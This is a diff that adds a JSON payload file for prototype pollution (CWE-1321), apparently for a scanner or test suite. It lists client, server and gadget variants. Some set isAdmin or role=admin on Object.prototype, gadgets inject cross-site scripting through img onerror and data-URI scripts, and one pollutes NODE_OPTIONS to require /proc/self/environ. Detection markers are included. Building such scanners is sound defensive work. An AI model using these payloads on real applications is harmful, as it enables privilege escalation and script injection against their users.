@@ -1,0 +1,13 @@
+{
+  "variants": {
+    "client": ["?__proto__[isAdmin]=true", "?constructor[prototype][isAdmin]=true", "?__proto__.polluted=true", "JSON.parse('{\"__proto__\":{\"isAdmin\":true}}')", "?__proto__[role]=admin"],
+    "server": ["{\"__proto__\":{\"isAdmin\":true}}", "{\"constructor\":{\"prototype\":{\"role\":\"admin\"}}}", "{\"__proto__\":{\"toString\":\"valueOf\"}}", "{\"__proto__\":{\"env\":{\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}}"],
+    "gadgets": ["?__proto__[src]=/images/loading.gif", "?__proto__[innerHTML]=<img src=x onerror=alert(1)>", "?__proto__[value]=data:text/html,<script>alert(1)</script>", "?__proto__[type]=image/x-icon", "?__proto__[disabled]="]
+  },
+  "payloads": ["?__proto__[isAdmin]=true", "?constructor[prototype][isAdmin]=true", "{\"__proto__\":{\"isAdmin\":true}}"],
+  "markers": ["[object Object]", "isAdmin", "true", "role", "admin"],
+  "metadata": {
+    "cwe": "CWE-1321",
+    "technique": "Prototype Pollution"
+  }
+}
